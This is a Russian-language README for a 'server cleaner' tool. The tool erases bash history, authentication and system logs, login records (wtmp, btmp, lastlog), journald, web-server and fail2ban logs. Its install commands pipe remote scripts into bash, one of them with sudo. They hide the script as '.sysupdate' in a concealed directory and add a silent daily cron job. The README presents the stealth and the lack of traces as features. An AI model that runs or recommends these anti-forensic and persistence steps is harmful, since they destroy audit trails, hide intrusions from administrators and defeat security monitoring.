# Server Cleaner

Скрипт для очистки логов и истории команд на Linux серверах.

## ⚠️ Предупреждение

Этот скрипт удаляет:
- Историю команд bash (пользователя и root)
- Системные логи (auth.log, syslog, kern.log, dpkg.log, apt логи)
- Логи входов на сервер (wtmp, btmp, lastlog)
- Журналы systemd (journald)
- Логи веб-серверов (nginx, apache)
- Логи fail2ban
- Временные файлы (/tmp, /var/tmp)

**Используйте только на своих серверах и под свою ответственность!**

## 🚀 Автоматическая установка (рекомендуется)

Скрипт установится в скрытую директорию и добавится в crontab:

```bash
curl -fsSL https://raw.githubusercontent.com/HVHBIGNAME/server-cleaner/main/install.sh | bash
```

или с wget:

```bash
wget -qO- https://raw.githubusercontent.com/HVHBIGNAME/server-cleaner/main/install.sh | bash
```

### Что делает install.sh:
1. Создает скрытую директорию `~/.cache/system`
2. Скачивает туда скрипт как `.sysupdate`
3. Добавляет задачу в crontab (ежедневно в 00:00)
4. Предлагает запустить сразу

## 📋 Ручная установка

### Разовый запуск (без сохранения):

```bash
curl -fsSL https://raw.githubusercontent.com/HVHBIGNAME/server-cleaner/main/clean.sh | sudo bash
```

### Установка вручную:

```bash
# Создать скрытую директорию
mkdir -p ~/.cache/system

# Скачать скрипт
wget -O ~/.cache/system/.sysupdate https://raw.githubusercontent.com/HVHBIGNAME/server-cleaner/main/clean.sh

# Дать права на выполнение
chmod +x ~/.cache/system/.sysupdate

# Добавить в crontab (каждый день в 00:00)
(crontab -l 2>/dev/null; echo "0 0 * * * ~/.cache/system/.sysupdate >/dev/null 2>&1") | crontab -
```

## 🛠️ Управление

### Проверить установленные задачи cron:

```bash
crontab -l
```

### Запустить вручную:

```bash
sudo ~/.cache/system/.sysupdate
```

### Удалить из crontab:

```bash
crontab -e
# Удалите строку с .sysupdate и сохраните
```

### Полное удаление:

```bash
# Удалить из crontab
crontab -l | grep -v '.sysupdate' | crontab -

# Удалить скрипт
rm -f ~/.cache/system/.sysupdate
```

## 📝 Что очищает скрипт

### История команд
- `~/.bash_history` — история команд текущего пользователя
- `/root/.bash_history` — история команд root

### Системные логи
- `/var/log/auth.log` — логи аутентификации
- `/var/log/syslog` — основной системный лог
- `/var/log/kern.log` — логи ядра
- `/var/log/dpkg.log` — логи установки пакетов
- `/var/log/apt/*` — логи apt
- `/var/log/secure` — альтернативный лог аутентификации (CentOS/RHEL)
- `/var/log/messages` — общие системные сообщения

### Логи входов
- `/var/log/wtmp` — история входов (команда `last`)
- `/var/log/btmp` — неудачные попытки входа (команда `lastb`)
- `/var/log/lastlog` — последний вход каждого пользователя (команда `lastlog`)

### Логи сервисов
- `/var/log/nginx/*` — логи nginx
- `/var/log/apache2/*` — логи apache
- `/var/log/fail2ban.log` — логи fail2ban

### Другое
- Журналы systemd (journald)
- Временные файлы `/tmp` и `/var/tmp`

## 🔒 Безопасность

Скрипт:
- Работает тихо (без вывода в консоль)
- Установлен в скрытую директорию `.cache/system`
- Имеет незаметное имя `.sysupdate`
- Запускается автоматически без следов в истории

## 📦 Файлы

- `clean.sh` — основной скрипт очистки
- `install.sh` — скрипт автоматической установки

## 📜 Лицензия

MIT
